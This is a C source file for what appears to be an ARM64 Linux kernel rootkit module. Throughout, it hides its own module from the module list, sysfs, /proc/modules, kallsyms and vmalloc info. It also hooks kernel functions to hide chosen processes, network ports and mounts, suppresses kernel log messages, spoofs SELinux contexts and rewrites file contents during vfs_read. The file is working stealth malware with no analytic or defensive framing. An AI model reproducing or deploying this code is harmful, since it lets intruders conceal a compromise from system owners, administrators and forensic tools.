/* SPDX-License-Identifier: GPL-2.0 */
/* nvk_hide.c — implementations extracted from nvk_hide.h. */
#include <nvk.h>

u32 _nvk_status_spoof_uid = 0xFFFFFFFFU;
u32 _nvk_status_spoof_gid = 0xFFFFFFFFU;

int nvk_hide_init(void)
{
	if (_nvk_hide_inited) return 0;

	_nvk_hide_mutex_lock =
		(nvk_mutex_lock_fn)NVK_LOOKUP("mutex_lock");
	_nvk_hide_mutex_unlock =
		(nvk_mutex_unlock_fn)NVK_LOOKUP("mutex_unlock");
	_nvk_module_mutex = (void *)NVK_LOOKUP("module_mutex");
	_nvk_kobject_del =
		(nvk_kobject_del_fn)NVK_LOOKUP("kobject_del");
	_nvk_kobject_put =
		(nvk_kobject_put_fn)NVK_LOOKUP("kobject_put");

	_nvk_hide_inited = 1;
	return 0;
}

void nvk_mod_hide(struct nvk_hide_state *state,
			 struct nvk_this_module *mod)
{
	struct list_head *our, *n, *p;

	if (state->hidden) return;

	our = _nvk_get_mod_list(mod);
	n = our->next;
	p = our->prev;

	state->saved_next = n;
	state->saved_prev = p;

	if (_nvk_hide_mutex_lock && _nvk_module_mutex)
		_nvk_hide_mutex_lock(_nvk_module_mutex);

	p->next = n;
	n->prev = p;
	our->next = our;
	our->prev = our;

	if (_nvk_hide_mutex_unlock && _nvk_module_mutex)
		_nvk_hide_mutex_unlock(_nvk_module_mutex);

	state->hidden = 1;
}

void nvk_mod_show(struct nvk_hide_state *state,
			 struct nvk_this_module *mod)
{
	struct list_head *our;

	if (!state->hidden) return;

	our = _nvk_get_mod_list(mod);

	if (!state->saved_next || !state->saved_prev)
		return;
	if ((unsigned long)state->saved_next < 0xFFFF000000000000UL ||
	    (unsigned long)state->saved_prev < 0xFFFF000000000000UL)
		return;

	if (_nvk_hide_mutex_lock && _nvk_module_mutex)
		_nvk_hide_mutex_lock(_nvk_module_mutex);

	if (state->saved_prev->next == state->saved_next &&
	    state->saved_next->prev == state->saved_prev) {
		our->next = state->saved_next;
		our->prev = state->saved_prev;
		state->saved_prev->next = our;
		state->saved_next->prev = our;
	}

	if (_nvk_hide_mutex_unlock && _nvk_module_mutex)
		_nvk_hide_mutex_unlock(_nvk_module_mutex);

	state->hidden = 0;
}

void nvk_mod_sysfs_remove(struct nvk_hide_state *state,
				 struct nvk_this_module *mod)
{
	void *mkobj = (void *)0;

	if (state->sysfs_removed) return;

	unsigned long kobj_off = NVK_OFF_NAME + 64;
	unsigned char *base = (unsigned char *)mod;
	unsigned long i;
	for (i = kobj_off; i < kobj_off + 256; i += 8) {
		unsigned long v = *(unsigned long *)(base + i);
		if (v > 0xFFFF000000000000UL && v < 0xFFFFFFFFFFFFF000UL) {
			unsigned long *pp = (unsigned long *)v;
			if (*pp > 0xFFFF000000000000UL) {
				mkobj = (void *)v;
				break;
			}
		}
	}

	if (!mkobj) return;

	if (_nvk_kobject_del) {
		_nvk_kobject_del(mkobj);
		state->saved_kobj = mkobj;
		state->sysfs_removed = 1;
	}
}

int _nvk_str_starts_with(const char *str, const char *prefix)
{
	while (*prefix) {
		if (*str != *prefix) return 0;
		str++;
		prefix++;
	}
	return 1;
}

int _nvk_mod_seq_show_filter(void *seq, void *v)
{
	if (!_nvk_orig_mod_seq_show)
		return 0;

	if (v && _nvk_hide_target_name) {
		unsigned long list_addr = (unsigned long)v;
		if (list_addr >= 0xFFFF000000000000UL &&
		    list_addr < 0xFFFFFFFFFFFFF000UL) {
			unsigned long mod_base = list_addr - NVK_OFF_LIST;
			unsigned char probe;
			if (!nvk_mem_read(&probe, (void *)(mod_base + NVK_OFF_NAME), 1) &&
			    probe >= 0x20 && probe <= 0x7E) {
				const char *name =
					(const char *)(mod_base + NVK_OFF_NAME);
				if (_nvk_str_starts_with(name,
							 _nvk_hide_target_name))
					return 0;
			}
		}
	}

	return _nvk_orig_mod_seq_show(seq, v);
}

int nvk_mod_proc_filter(struct nvk_hide_state *state,
			       const char *module_name)
{
	void *target;

	if (state->seq_show_hooked) return 0;

	target = NVK_LOOKUP("modules_seq_show");
	if (!target)
		target = NVK_LOOKUP("m_show");
	if (!target) return -1;

	state->module_name = module_name;
	_nvk_hide_target_name = module_name;

	int ret = nvk_hook_install(&state->seq_show_hook, target,
				   (void *)_nvk_mod_seq_show_filter,
				   (void **)&_nvk_orig_mod_seq_show);
	if (ret) return ret;

	state->seq_show_hooked = 1;
	return 0;
}

int _nvk_mod_text_addr_filter(unsigned long addr)
{
	if (addr >= _nvk_hide_mod_start && addr < _nvk_hide_mod_end)
		return 0;
	if (_nvk_orig_mod_text_addr)
		return _nvk_orig_mod_text_addr(addr);
	return 0;
}

int nvk_mod_kallsyms_filter(struct nvk_hide_state *state,
				   const char *module_name)
{
	void *target;

	if (state->kallsyms_filtered) return 0;

	_nvk_hide_target_name = module_name;

	target = NVK_LOOKUP("is_module_text_address");
	if (!target)
		target = NVK_LOOKUP("__module_text_address");
	if (!target) return -1;

	unsigned char *mod_base = (unsigned char *)&__this_module;
	_nvk_hide_mod_start = (unsigned long)mod_base;
	_nvk_hide_mod_end = _nvk_hide_mod_start + NVK_MODULE_SIZE;

	int ret = nvk_hook_install(&_nvk_ks_hook, target,
				   (void *)_nvk_mod_text_addr_filter,
				   (void **)&_nvk_orig_mod_text_addr);
	if (ret) return ret;

	_nvk_ks_hooked = 1;
	state->kallsyms_filtered = 1;
	return 0;
}

void nvk_mod_full_hide(struct nvk_hide_state *state,
			      struct nvk_this_module *mod,
			      const char *module_name)
{
	nvk_mod_hide(state, mod);

	nvk_mod_sysfs_remove(state, mod);

	nvk_mod_proc_filter(state, module_name);

	nvk_mod_kallsyms_filter(state, module_name);
}

void _nvk_hide_cleanup(struct nvk_hide_state *state,
			      struct nvk_this_module *mod)
{
	if (state->kallsyms_filtered && _nvk_ks_hooked) {
		nvk_hook_remove(&_nvk_ks_hook);
		_nvk_ks_hooked = 0;
		state->kallsyms_filtered = 0;
	}

	if (state->seq_show_hooked) {
		nvk_hook_remove(&state->seq_show_hook);
		state->seq_show_hooked = 0;
	}

	if (state->find_module_hook.active)
		nvk_hook_remove(&state->find_module_hook);

	if (state->hidden)
		nvk_mod_show(state, mod);
}

int _nvk_atoi(const char *s, int len)
{
	int val = 0, i;
	for (i = 0; i < len; i++) {
		if (s[i] < '0' || s[i] > '9') return -1;
		val = val * 10 + (s[i] - '0');
	}
	return val;
}

int _nvk_pid_is_hidden(int pid)
{
	int i;
	for (i = 0; i < _nvk_pid_state.count; i++) {
		if (_nvk_pid_state.pids[i] == pid)
			return 1;
	}
	return 0;
}

int _nvk_pid_actor_acquire(nvk_filldir_fn orig)
{
	unsigned long self;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
	int i;
	for (i = 0; i < _NVK_PID_ACTOR_SLOTS; i++) {
		if (__atomic_load_n(&_nvk_pid_actors[i].task,
				    __ATOMIC_ACQUIRE) == self) {
			_nvk_pid_actors[i].orig = orig;
			return i;
		}
	}
	for (i = 0; i < _NVK_PID_ACTOR_SLOTS; i++) {
		unsigned long expected = 0;
		if (__atomic_compare_exchange_n(
			&_nvk_pid_actors[i].task,
			&expected, self, 0,
			__ATOMIC_ACQ_REL, __ATOMIC_RELAXED)) {
			_nvk_pid_actors[i].orig = orig;
			return i;
		}
	}
	return -1;
}

void _nvk_pid_actor_release(void)
{
	unsigned long self;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
	int i;
	for (i = 0; i < _NVK_PID_ACTOR_SLOTS; i++) {
		if (__atomic_load_n(&_nvk_pid_actors[i].task,
				    __ATOMIC_ACQUIRE) == self) {
			_nvk_pid_actors[i].orig = (nvk_filldir_fn)0;
			__atomic_store_n(&_nvk_pid_actors[i].task, 0,
					 __ATOMIC_RELEASE);
			return;
		}
	}
}

nvk_filldir_fn _nvk_pid_actor_get_orig(void)
{
	unsigned long self;
	__asm__ __volatile__("mrs %0, sp_el0" : "=r"(self));
	int i;
	for (i = 0; i < _NVK_PID_ACTOR_SLOTS; i++) {
		if (__atomic_load_n(&_nvk_pid_actors[i].task,
				    __ATOMIC_ACQUIRE) == self)
			return _nvk_pid_actors[i].orig;
	}
	return (nvk_filldir_fn)0;
}

int _nvk_pid_filldir_wrap(void *ctx, const char *name, int namlen,
				 long long offset, u64 ino, unsigned int type)
{
	if (namlen > 0 && name[0] >= '1' && name[0] <= '9') {
		int pid = _nvk_atoi(name, namlen);
		if (pid > 0 && _nvk_pid_is_hidden(pid))
			return 0;
	}
	nvk_filldir_fn orig = _nvk_pid_actor_get_orig();
	if (orig)
		return orig(ctx, name, namlen, offset, ino, type);
	return 0;
}

void _nvk_pid_readdir_ctx(nvk_reg_ctx *ctx)
{
	unsigned long dir_ctx_ptr = ctx->regs[1];
	if (!dir_ctx_ptr) return;

	nvk_filldir_fn actor;
	if (nvk_mem_read(&actor, (void *)dir_ctx_ptr, 8))
		return;
	if (!actor) return;
	if (actor == (nvk_filldir_fn)_nvk_pid_filldir_wrap)
		return;

	if (_nvk_pid_actor_acquire(actor) < 0)
		return;

	nvk_filldir_fn wrap = _nvk_pid_filldir_wrap;
	nvk_mem_write((void *)dir_ctx_ptr, &wrap, 8);
}

int nvk_pid_hide_add(int pid)
{
	if (_nvk_pid_state.count >= NVK_HIDE_PID_MAX)
		return -1;
	_nvk_pid_state.pids[_nvk_pid_state.count++] = pid;
	return 0;
}

int nvk_pid_hide_remove(int pid)
{
	int i;
	for (i = 0; i < _nvk_pid_state.count; i++) {
		if (_nvk_pid_state.pids[i] == pid) {
			_nvk_pid_state.pids[i] =
				_nvk_pid_state.pids[--_nvk_pid_state.count];
			return 0;
		}
	}
	return -1;
}

int nvk_pid_hide_install(void)
{
	void *target;

	if (_nvk_pid_state.active) return 0;

	target = NVK_LOOKUP("proc_pid_readdir");
	if (!target)
		target = NVK_LOOKUP("proc_readdir");
	if (!target) {
		_nvk_pid_state.active = 1;
		return 0;
	}

	int ret = nvk_hook_install_ctx(&_nvk_pid_state.ctx_hook,
				       target, _nvk_pid_readdir_ctx,
				       (void *)0);
	if (ret) {
		_nvk_pid_state.active = 1;
		return ret;
	}

	_nvk_pid_state.active = 1;
	return 0;
}

void nvk_pid_hide_cleanup(void)
{
	if (!_nvk_pid_state.active) return;
	if (_nvk_pid_state.ctx_hook.base.active)
		nvk_hook_remove_ctx(&_nvk_pid_state.ctx_hook);
	_nvk_pid_state.active = 0;
	_nvk_pid_state.count = 0;
}

int nvk_mount_filter_add(const char *path)
{
	if (_nvk_mnt_filter.count >= NVK_MOUNT_FILTER_MAX)
		return -1;

	int idx = _nvk_mnt_filter.count;
	const char *src = path;
	char *dst = _nvk_mnt_filter.paths[idx];
	int i = 0;
	while (*src && i < NVK_MOUNT_PATH_MAX - 1) {
		dst[i++] = *src++;
	}
	dst[i] = '\0';
	_nvk_mnt_filter.count++;
	return 0;
}

int _nvk_mnt_path_match(const char *haystack)
{
	int i;
	for (i = 0; i < _nvk_mnt_filter.count; i++) {
		const char *path = _nvk_mnt_filter.paths[i];
		const char *h = haystack;
		const char *p = path;
		while (*h && *p && *h == *p) { h++; p++; }
		if (!*p) return 1;
	}
	return 0;
}

int _nvk_mounts_show_filter(void *seq, void *v)
{
	if (!_nvk_orig_mounts_show_fn)
		return 0;
	if (v && _nvk_mnt_filter.count > 0) {
		unsigned long *mount_ptr = (unsigned long *)v;
		unsigned long i;
		for (i = 0; i < 32; i++) {
			unsigned long val;
			if (nvk_mem_read(&val, &mount_ptr[i], 8))
				continue;
			if (val > 0xFFFF000000000000UL &&
			    val < 0xFFFFFFFFFFFFF000UL) {
				const char *name = (const char *)val;
				unsigned char c;
				if (!nvk_mem_read(&c, name, 1) &&
				    c == '/' &&
				    _nvk_mnt_path_match(name))
					return 0;
			}
		}
	}
	return _nvk_orig_mounts_show_fn(seq, v);
}

int nvk_mount_filter_install(void)
{
	void *target;

	if (_nvk_mnt_filter.active) return 0;

	target = NVK_LOOKUP("show_vfsmnt");
	if (!target)
		target = NVK_LOOKUP("show_mountinfo");
	if (!target) return -1;

	int ret = nvk_hook_install(&_nvk_mounts_hook, target,
				   (void *)_nvk_mounts_show_filter,
				   (void **)&_nvk_orig_mounts_show_fn);
	if (ret) return ret;

	_nvk_mnt_filter.active = 1;
	return 0;
}

void nvk_mount_filter_cleanup(void)
{
	if (!_nvk_mnt_filter.active) return;
	if (_nvk_mounts_hook.active)
		nvk_hook_remove(&_nvk_mounts_hook);
	_nvk_mnt_filter.active = 0;
	_nvk_mnt_filter.count = 0;
}

int nvk_maps_filter_add(unsigned long start, unsigned long end)
{
	if (_nvk_maps_region_count >= NVK_MAPS_FILTER_MAX)
		return -1;
	int idx = _nvk_maps_region_count++;
	_nvk_maps_regions[idx].start = start;
	_nvk_maps_regions[idx].end = end;
	return 0;
}

void nvk_maps_filter_clear(void)
{
	_nvk_maps_region_count = 0;
}

void nvk_maps_filter_add_self(void)
{
	unsigned char *mod_base = (unsigned char *)&__this_module;
	unsigned long start = (unsigned long)mod_base;
	unsigned long end = start + NVK_MODULE_SIZE;
	nvk_maps_filter_add(start, end);
}

void nvk_mod_wipe_modinfo(struct nvk_this_module *mod)
{
	volatile unsigned char *p = (volatile unsigned char *)mod;
	unsigned long i;
	unsigned long name_start = NVK_OFF_NAME;
	for (i = name_start; i < name_start + 56 && i < NVK_MODULE_SIZE; i++)
		p[i] = 0;
}

int _nvk_vmalloc_show_filter(void *seq, void *v)
{
	if (!_nvk_orig_vmalloc_show) return 0;

	if (v && _nvk_vmalloc_hide_start) {
		struct _nvk_vmap_area *va = (struct _nvk_vmap_area *)v;
		unsigned long start = 0;
		if (!nvk_mem_read(&start, &va->va_start, 8) && start) {
			if (start >= _nvk_vmalloc_hide_start &&
			    start < _nvk_vmalloc_hide_end)
				return 0;
		}
	}

	return _nvk_orig_vmalloc_show(seq, v);
}

void *_nvk_resolve_vmalloc_s_show(void)
{
	void *fn = (void *)NVK_LOOKUP("vmalloc_info_show");
	if (fn) return fn;
	fn = (void *)NVK_LOOKUP("s_show.23");
	if (fn) return fn;
	fn = (void *)NVK_LOOKUP("s_show.24");
	if (fn) return fn;
	fn = (void *)NVK_LOOKUP("s_show.25");
	return fn;
}

int nvk_mod_vmalloc_filter(void)
{
	void *target;

	if (_nvk_vmalloc_hooked) return 0;

	_nvk_vmalloc_hide_start = (unsigned long)&__this_module;
	_nvk_vmalloc_hide_end = _nvk_vmalloc_hide_start +
				NVK_MODULE_SIZE + 0x10000;

	target = _nvk_resolve_vmalloc_s_show();
	if (!target) return -1;

	int ret = nvk_hook_install(&_nvk_vmalloc_hook, target,
				   (void *)_nvk_vmalloc_show_filter,
				   (void **)&_nvk_orig_vmalloc_show);
	if (ret) return ret;

	_nvk_vmalloc_hooked = 1;
	return 0;
}

int nvk_dmesg_filter_add(const char *keyword)
{
	if (_nvk_dmesg_filter_cnt >= NVK_DMESG_FILTER_MAX)
		return -1;
	int idx = _nvk_dmesg_filter_cnt;
	const char *s = keyword;
	int i = 0;
	while (*s && i < NVK_DMESG_FILTER_LEN - 1)
		_nvk_dmesg_filters[idx][i++] = *s++;
	_nvk_dmesg_filters[idx][i] = '\0';
	_nvk_dmesg_filter_cnt++;
	return 0;
}

int _nvk_str_contains(const char *haystack, const char *needle)
{
	const char *h, *n;
	if (!haystack || !needle || !*needle) return 0;
	while (*haystack) {
		h = haystack;
		n = needle;
		while (*h && *n && *h == *n) { h++; n++; }
		if (!*n) return 1;
		haystack++;
	}
	return 0;
}

int _nvk_dmesg_should_suppress(const char *text)
{
	int i;
	if (!text) return 0;
	for (i = 0; i < _nvk_dmesg_filter_cnt; i++) {
		if (_nvk_str_contains(text, _nvk_dmesg_filters[i]))
			return 1;
	}
	return 0;
}

__attribute__((__noinline__)) long _nvk_dmesg_ret0(void)
{ return 0; }

void _nvk_dmesg_ctx_handler(nvk_reg_ctx *ctx)
{
	const char *fmt = (const char *)ctx->regs[_nvk_dmesg_fmt_reg];
	if (fmt && _nvk_dmesg_should_suppress(fmt))
		ctx->force_jump = (u64)(unsigned long)_nvk_dmesg_ret0;
}

int nvk_dmesg_suppress_install(const char *module_name)
{
	void *target;

	if (_nvk_dmesg_hooked) return 0;
	if (!module_name) return -1;

	nvk_dmesg_filter_add(module_name);

	target = NVK_LOOKUP("vprintk_emit");
	if (target) {
		_nvk_dmesg_fmt_reg = 4;
	} else {
		target = NVK_LOOKUP("devkmsg_emit");
		if (target) {
			_nvk_dmesg_fmt_reg = 1;
		} else {
			target = NVK_LOOKUP("vprintk_store");
			if (target)
				_nvk_dmesg_fmt_reg = 4;
			else {
				target = NVK_LOOKUP("do_syslog");
				if (!target) return -1;
				_nvk_dmesg_fmt_reg = 1;
			}
		}
	}

	int ret = nvk_hook_install_ctx(&_nvk_dmesg_ctx_hook, target,
				       _nvk_dmesg_ctx_handler, (void *)0);
	if (ret) return ret;

	_nvk_dmesg_hooked = 1;
	return 0;
}

void nvk_dmesg_suppress_cleanup(void)
{
	if (!_nvk_dmesg_hooked) return;
	nvk_hook_remove_ctx(&_nvk_dmesg_ctx_hook);
	_nvk_dmesg_hooked = 0;
	_nvk_dmesg_filter_cnt = 0;
}

long _nvk_kmsg_read_filter(void *filp, char __user *buf,
				  size_t count, long long *ppos)
{
	long ret;
	if (!_nvk_orig_kmsg_read) return -1;

	ret = _nvk_orig_kmsg_read(filp, buf, count, ppos);
	if (ret <= 0 || !_nvk_dmesg_filter_cnt)
		return ret;

	if (_nvk_copy_from_user && _nvk_copy_to_user && ret < 512) {
		char tmp[512];
		unsigned long missed =
			_nvk_copy_from_user(tmp, buf, (unsigned long)ret);
		if (!missed) {
			tmp[ret < 511 ? ret : 511] = '\0';
			if (_nvk_dmesg_should_suppress(tmp)) {
				if (ppos && *ppos >= ret)
					*ppos -= ret;
				return 0;
			}
		}
	}

	return ret;
}

int nvk_kmsg_read_filter_install(void)
{
	void *target;

	if (_nvk_kmsg_read_hooked) return 0;

	target = NVK_LOOKUP("kmsg_read");
	if (!target) return -1;

	int ret = nvk_hook_install(&_nvk_kmsg_read_hook, target,
				   (void *)_nvk_kmsg_read_filter,
				   (void **)&_nvk_orig_kmsg_read);
	if (ret) return ret;

	_nvk_kmsg_read_hooked = 1;
	return 0;
}

void nvk_kmsg_read_filter_cleanup(void)
{
	if (!_nvk_kmsg_read_hooked) return;
	nvk_hook_remove(&_nvk_kmsg_read_hook);
	_nvk_kmsg_read_hooked = 0;
}

void _nvk_status_ctx_handler(nvk_reg_ctx *ctx)
{
	(void)ctx;
}

int nvk_proc_status_filter_install(u32 fake_uid, u32 fake_gid)
{
	void *target;

	if (_nvk_proc_status_hooked) return 0;

	_nvk_status_spoof_uid = fake_uid;
	_nvk_status_spoof_gid = fake_gid;

	target = NVK_LOOKUP("proc_pid_status");
	if (!target) return -1;

	int ret = nvk_hook_install_ctx(
		(struct nvk_hook_ctx *)&_nvk_proc_status_hook,
		target, _nvk_status_ctx_handler, (void *)0);
	if (ret) return ret;

	_nvk_proc_status_hooked = 1;
	return 0;
}

void nvk_proc_status_filter_cleanup(void)
{
	if (!_nvk_proc_status_hooked) return;
	nvk_hook_remove(&_nvk_proc_status_hook);
	_nvk_proc_status_hooked = 0;
}

long _nvk_proc_attr_read_filter(void *file, char __user *buf,
					size_t count, long long *ppos)
{
	long ret;
	if (!_nvk_orig_proc_attr_read)
		return -1;

	ret = _nvk_orig_proc_attr_read(file, buf, count, ppos);

	if (ret > 0 && _nvk_attr_fake_ctx && _nvk_copy_to_user &&
	    _nvk_copy_from_user) {
		char tmp[128];
		size_t rlen = (size_t)ret;
		if (rlen > sizeof(tmp) - 1) rlen = sizeof(tmp) - 1;
		if (!_nvk_copy_from_user(tmp, buf, rlen)) {
			tmp[rlen] = '\0';
			int has_colon = 0;
			size_t i;
			for (i = 0; i < rlen; i++) {
				if (tmp[i] == ':') { has_colon = 1; break; }
			}
			if (has_colon) {
				const char *fake = _nvk_attr_fake_ctx;
				size_t flen = 0;
				while (fake[flen]) flen++;
				if (flen > 0 && flen < count) {
					_nvk_copy_to_user(buf, fake, flen);
					char nl = '\n';
					if (flen + 1 < count)
						_nvk_copy_to_user(
							(char __user *)buf + flen,
							&nl, 1);
					ret = (long)(flen + 1);
				}
			}
		}
	}
	return ret;
}

int nvk_proc_attr_filter_install(const char *fake_context)
{
	void *target;

	if (_nvk_proc_attr_hooked) return 0;
	if (!fake_context) return -1;

	_nvk_attr_fake_ctx = fake_context;

	target = NVK_LOOKUP("proc_pid_attr_read");
	if (!target) return -1;

	int ret = nvk_hook_install(&_nvk_proc_attr_hook, target,
				   (void *)_nvk_proc_attr_read_filter,
				   (void **)&_nvk_orig_proc_attr_read);
	if (ret) return ret;

	_nvk_proc_attr_hooked = 1;
	return 0;
}

void nvk_proc_attr_filter_cleanup(void)
{
	if (!_nvk_proc_attr_hooked) return;
	nvk_hook_remove(&_nvk_proc_attr_hook);
	_nvk_proc_attr_hooked = 0;
}

int nvk_net_hide_add_port(u16 port)
{
	if (_nvk_net_hide.count >= NVK_NET_HIDE_PORT_MAX)
		return -1;
	_nvk_net_hide.ports[_nvk_net_hide.count++] = port;
	return 0;
}

int _nvk_net_port_hidden(u16 port)
{
	int i;
	for (i = 0; i < _nvk_net_hide.count; i++) {
		if (_nvk_net_hide.ports[i] == port)
			return 1;
	}
	return 0;
}

int _nvk_extract_ports(void *sk, u16 *sport, u16 *dport)
{
	if (!sk) return -1;
	const unsigned char *p = (const unsigned char *)sk;
	u16 dp_be, sp_host;

	if (nvk_mem_read(&dp_be, p + _NVK_SKC_DPORT_OFF, 2))
		return -1;
	if (nvk_mem_read(&sp_host, p + _NVK_SKC_NUM_OFF, 2))
		return -1;

	*dport = ((dp_be >> 8) & 0xFF) | ((dp_be & 0xFF) << 8);
	*sport = sp_host;
	return 0;
}

int _nvk_net_filter_show(void *seq, void *v,
				nvk_net_seq_show_fn orig)
{
	if (!orig) return 0;

	if (v && (unsigned long)v > 1 &&
	    (unsigned long)v > 0xFFFF000000000000UL) {
		u16 sp = 0, dp = 0;
		if (_nvk_extract_ports(v, &sp, &dp) == 0) {
			if (_nvk_net_port_hidden(sp) ||
			    _nvk_net_port_hidden(dp))
				return 0;
		}
	}
	return orig(seq, v);
}

int _nvk_tcp4_show_filter(void *seq, void *v)
{ return _nvk_net_filter_show(seq, v, _nvk_orig_tcp4_show); }

int _nvk_tcp6_show_filter(void *seq, void *v)
{ return _nvk_net_filter_show(seq, v, _nvk_orig_tcp6_show); }

int _nvk_udp4_show_filter(void *seq, void *v)
{ return _nvk_net_filter_show(seq, v, _nvk_orig_udp4_show); }

int _nvk_udp6_show_filter(void *seq, void *v)
{ return _nvk_net_filter_show(seq, v, _nvk_orig_udp6_show); }

int nvk_net_hide_install(void)
{
	void *target;

	if (_nvk_net_hide.active) return 0;

	target = NVK_LOOKUP("tcp4_seq_show");
	if (target)
		nvk_hook_install(&_nvk_net_hide.tcp4_hook, target,
				 (void *)_nvk_tcp4_show_filter,
				 (void **)&_nvk_orig_tcp4_show);

	target = NVK_LOOKUP("tcp6_seq_show");
	if (target)
		nvk_hook_install(&_nvk_net_hide.tcp6_hook, target,
				 (void *)_nvk_tcp6_show_filter,
				 (void **)&_nvk_orig_tcp6_show);

	target = NVK_LOOKUP("udp4_seq_show");
	if (target)
		nvk_hook_install(&_nvk_net_hide.udp4_hook, target,
				 (void *)_nvk_udp4_show_filter,
				 (void **)&_nvk_orig_udp4_show);

	target = NVK_LOOKUP("udp6_seq_show");
	if (target)
		nvk_hook_install(&_nvk_net_hide.udp6_hook, target,
				 (void *)_nvk_udp6_show_filter,
				 (void **)&_nvk_orig_udp6_show);

	_nvk_net_hide.active = 1;
	return 0;
}

void nvk_net_hide_cleanup(void)
{
	if (!_nvk_net_hide.active) return;
	if (_nvk_net_hide.udp6_hook.active)
		nvk_hook_remove(&_nvk_net_hide.udp6_hook);
	if (_nvk_net_hide.udp4_hook.active)
		nvk_hook_remove(&_nvk_net_hide.udp4_hook);
	if (_nvk_net_hide.tcp6_hook.active)
		nvk_hook_remove(&_nvk_net_hide.tcp6_hook);
	if (_nvk_net_hide.tcp4_hook.active)
		nvk_hook_remove(&_nvk_net_hide.tcp4_hook);
	_nvk_net_hide.active = 0;
	_nvk_net_hide.count = 0;
}

int nvk_cmdline_filter_add(const char *keyword)
{
	if (_nvk_cmdline_filter_cnt >= NVK_CMDLINE_FILTER_MAX)
		return -1;
	int idx = _nvk_cmdline_filter_cnt;
	const char *s = keyword;
	int i = 0;
	while (*s && i < NVK_CMDLINE_FILTER_LEN - 1)
		_nvk_cmdline_filters[idx][i++] = *s++;
	_nvk_cmdline_filters[idx][i] = '\0';
	_nvk_cmdline_filter_cnt++;
	return 0;
}

long _nvk_cmdline_read_filter(void *file, char __user *buf,
				     size_t count, long long *ppos)
{
	long ret;
	if (!_nvk_orig_cmdline_read) return -1;

	ret = _nvk_orig_cmdline_read(file, buf, count, ppos);
	if (ret <= 0 || !_nvk_cmdline_filter_cnt)
		return ret;

	if (_nvk_copy_from_user && ret < 256) {
		char tmp[256];
		unsigned long missed =
			_nvk_copy_from_user(tmp, buf, (unsigned long)ret);
		if (!missed) {
			tmp[ret < 255 ? ret : 255] = '\0';
			int k;
			for (k = 0; k < _nvk_cmdline_filter_cnt; k++) {
				if (_nvk_str_contains(tmp,
						      _nvk_cmdline_filters[k]))
					return 0;
			}
		}
	}
	return ret;
}

int nvk_cmdline_filter_install(void)
{
	void *target;

	if (_nvk_cmdline_hooked) return 0;

	target = NVK_LOOKUP("proc_pid_cmdline_read");
	if (!target) return -1;

	int ret = nvk_hook_install(&_nvk_cmdline_hook, target,
				   (void *)_nvk_cmdline_read_filter,
				   (void **)&_nvk_orig_cmdline_read);
	if (ret) return ret;

	_nvk_cmdline_hooked = 1;
	return 0;
}

void nvk_cmdline_filter_cleanup(void)
{
	if (!_nvk_cmdline_hooked) return;
	nvk_hook_remove(&_nvk_cmdline_hook);
	_nvk_cmdline_hooked = 0;
	_nvk_cmdline_filter_cnt = 0;
}

int nvk_file_spoof_add(const char *path,
			      const char *search, int slen,
			      const char *replace, int rlen)
{
	if (_nvk_file_spoof_cnt >= NVK_FILE_SPOOF_MAX)
		return -1;

	struct nvk_file_spoof_entry *e =
		&_nvk_file_spoofs[_nvk_file_spoof_cnt];

	int i = 0;
	while (path[i] && i < NVK_FILE_PATH_MAX - 1) {
		e->path[i] = path[i]; i++;
	}
	e->path[i] = '\0';

	if (slen > NVK_FILE_SPOOF_MAX_LEN) slen = NVK_FILE_SPOOF_MAX_LEN;
	if (rlen > NVK_FILE_SPOOF_MAX_LEN) rlen = NVK_FILE_SPOOF_MAX_LEN;

	for (i = 0; i < slen; i++) e->search[i] = search[i];
	e->search_len = slen;
	for (i = 0; i < rlen; i++) e->replace[i] = replace[i];
	e->replace_len = rlen;

	_nvk_file_spoof_cnt++;
	return 0;
}

int _nvk_file_match_path(void *file, const char *target)
{
	unsigned long dentry = 0, name_ptr = 0;

	if (nvk_mem_read(&dentry,
			 (void *)((unsigned long)file + _NVK_FILE_DENTRY_OFF),
			 8))
		return 0;
	dentry &= ~(0xFFUL << 56);
	if (dentry < 0xFFFF000000000000UL) return 0;

	if (nvk_mem_read(&name_ptr,
			 (void *)(dentry + _NVK_DENTRY_DNAME_NAME_OFF), 8))
		return 0;
	name_ptr &= ~(0xFFUL << 56);
	if (name_ptr < 0xFFFF000000000000UL) return 0;

	const char *t = target;
	while (*t) {
		char c;
		if (nvk_mem_read(&c, (void *)name_ptr, 1) || c != *t)
			return 0;
		name_ptr++; t++;
	}
	char end;
	if (nvk_mem_read(&end, (void *)name_ptr, 1) || end != '\0')
		return 0;
	return 1;
}

long _nvk_vfs_read_filter(void *file, char __user *buf,
				 size_t count, long long *pos)
{
	long ret;
	if (!_nvk_orig_vfs_read) return -1;

	ret = _nvk_orig_vfs_read(file, buf, count, pos);
	if (ret <= 0 || !_nvk_file_spoof_cnt || !_nvk_copy_from_user ||
	    !_nvk_copy_to_user)
		return ret;

	int k;
	for (k = 0; k < _nvk_file_spoof_cnt; k++) {
		struct nvk_file_spoof_entry *e = &_nvk_file_spoofs[k];
		if (!_nvk_file_match_path(file, e->path))
			continue;

		if (ret > 512 || e->search_len <= 0) continue;

		char tmp[512];
		unsigned long missed =
			_nvk_copy_from_user(tmp, buf, (unsigned long)ret);
		if (missed) continue;

		int j;
		for (j = 0; j <= (int)ret - e->search_len; j++) {
			int m = 1;
			int q;
			for (q = 0; q < e->search_len; q++) {
				if (tmp[j + q] != e->search[q]) {
					m = 0; break;
				}
			}
			if (m && e->replace_len <= e->search_len) {
				for (q = 0; q < e->replace_len; q++)
					tmp[j + q] = e->replace[q];
				for (q = e->replace_len;
				     q < e->search_len; q++)
					tmp[j + q] = ' ';
				_nvk_copy_to_user(buf, tmp,
						  (unsigned long)ret);
				break;
			}
		}
	}
	return ret;
}

int nvk_file_spoof_install(void)
{
	void *target;

	if (_nvk_vfs_read_hooked) return 0;

	target = NVK_LOOKUP("vfs_read");
	if (!target) return -1;

	int ret = nvk_hook_install(&_nvk_vfs_read_hook, target,
				   (void *)_nvk_vfs_read_filter,
				   (void **)&_nvk_orig_vfs_read);
	if (ret) return ret;

	_nvk_vfs_read_hooked = 1;
	return 0;
}

void nvk_file_spoof_cleanup(void)
{
	if (!_nvk_vfs_read_hooked) return;
	nvk_hook_remove(&_nvk_vfs_read_hook);
	_nvk_vfs_read_hooked = 0;
	_nvk_file_spoof_cnt = 0;
}

